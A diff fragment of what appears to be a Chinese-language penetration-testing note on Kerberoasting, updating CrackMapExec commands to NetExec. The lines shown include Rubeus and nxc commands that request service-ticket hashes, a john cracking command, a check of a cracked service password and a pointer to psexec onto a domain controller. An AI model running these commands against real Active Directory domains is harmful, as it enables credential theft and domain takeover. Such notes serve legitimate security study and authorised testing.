@@ -58,10 +58,10 @@ $krb5tgs$23$*svc-sql$CORP.LOCAL$corp.local/svc-sql*$1234ABCD...
 .\Rubeus.exe kerberoast /user:svc-sql /format:hashcat /outfile:svc-sql.txt
 ```
 
-### CrackMapExec
+### NetExec
 
 ```bash
-crackmapexec ldap 10.10.10.x -u alice -p 'Password123' --kerberoasting kerberoast.txt
+nxc ldap 10.10.10.x -u alice -p 'Password123' --kerberoasting kerberoast.txt
 ```
 
 ## 破解 TGS Hash
@@ -81,7 +81,7 @@ john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 ```bash
 # 確認帳號有效
-crackmapexec smb 10.10.10.x -u svc-sql -p 'ServicePassword1'
+nxc smb 10.10.10.x -u svc-sql -p 'ServicePassword1'
 
 # 如果是 Domain Admin
 # 直接 psexec 進 DC：
